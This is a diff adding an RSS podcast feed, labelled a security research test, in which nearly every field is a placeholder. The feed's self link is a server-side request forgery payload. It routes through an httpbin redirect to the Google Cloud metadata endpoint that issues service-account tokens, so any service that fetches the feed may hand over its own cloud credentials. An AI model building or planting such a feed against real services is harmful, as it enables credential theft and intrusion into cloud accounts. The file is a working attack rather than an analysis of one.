@@ -1,0 +1,31 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd" xmlns:googleplay="http://www.google.com/schemas/play-podcasts/1.0" xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>GHPAGES_METADATA_TEST</title>
+    <link>http://example.com/podcast</link>
+    <description>Security research test feed</description>
+    <language>en</language>
+    <atom:link href="https://httpbin.org/redirect-to?url=http%3A%2F%2Fmetadata.google.internal%2FcomputeMetadata%2Fv1beta1%2Finstance%2Fservice-accounts%2Fdefault%2Ftoken&amp;status_code=302" rel="self" type="application/rss+xml"/>
+    <itunes:author>Test Author</itunes:author>
+    <itunes:summary>Security research test feed</itunes:summary>
+    <itunes:type>episodic</itunes:type>
+    <itunes:explicit>false</itunes:explicit>
+    <itunes:category text="Technology"/>
+    <itunes:owner>
+      <itunes:name>Test Owner</itunes:name>
+      <itunes:email>test@example.com</itunes:email>
+    </itunes:owner>
+    <itunes:image href="https://via.placeholder.com/1400"/>
+    <image>
+      <url>https://via.placeholder.com/1400</url>
+      <title>GHPAGES_METADATA_TEST</title>
+      <link>http://example.com/podcast</link>
+    </image>
+    <item>
+      <title>Episode 1</title>
+      <description>Test episode</description>
+      <enclosure url="http://example.com/ep1.mp3" length="1024000" type="audio/mpeg"/>
+      <guid isPermaLink="false">ep1-test-guid</guid>
+    </item>
+  </channel>
+</rss>
